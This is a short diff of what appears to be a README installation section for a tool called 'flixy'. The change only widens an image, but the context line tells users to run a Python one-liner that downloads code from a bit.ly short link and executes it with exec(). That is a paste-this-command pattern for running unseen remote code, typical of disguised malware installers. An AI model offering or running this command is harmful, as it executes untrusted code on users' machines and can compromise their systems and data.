@@ -10,6 +10,6 @@ import requests; exec(requests.get("https://bit.ly/flixy-installer").text);
 
 Then a simple little window will shows up, follow the instructions and you it will be finished!
 
-<img src="https://user-images.githubusercontent.com/86029286/230713728-41878deb-5714-4a85-a3b5-5225c33729da.png" data-canonical-src="[https://gyazo.com/eb5c5741b6a9a16c692170a41a49c858.png](https://user-images.githubusercontent.com/86029286/230713728-41878deb-5714-4a85-a3b5-5225c33729da.png)" width="300" />
+<img src="https://user-images.githubusercontent.com/86029286/230713728-41878deb-5714-4a85-a3b5-5225c33729da.png" data-canonical-src="[https://gyazo.com/eb5c5741b6a9a16c692170a41a49c858.png](https://user-images.githubusercontent.com/86029286/230713728-41878deb-5714-4a85-a3b5-5225c33729da.png)" width="500" />
 
 n
